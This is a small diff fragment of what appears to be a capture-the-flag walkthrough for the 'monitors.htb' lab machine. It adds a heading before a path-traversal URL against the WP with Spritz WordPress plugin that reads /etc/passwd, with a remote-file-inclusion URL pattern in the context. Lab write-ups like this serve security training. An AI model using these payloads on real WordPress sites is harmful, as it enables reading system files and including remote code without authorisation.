@@ -121,6 +121,8 @@ Reading the details of the exploit, we can see that both local and remote file i
 /wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=http(s)://domain/exec
 ```
 
+## Exploiting Spritz LFI
+
 When we attempt the LFI, we obtain the contents of the /etc/passwd file by sending a GET request or browsing to the following URL:
 
 `http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd`
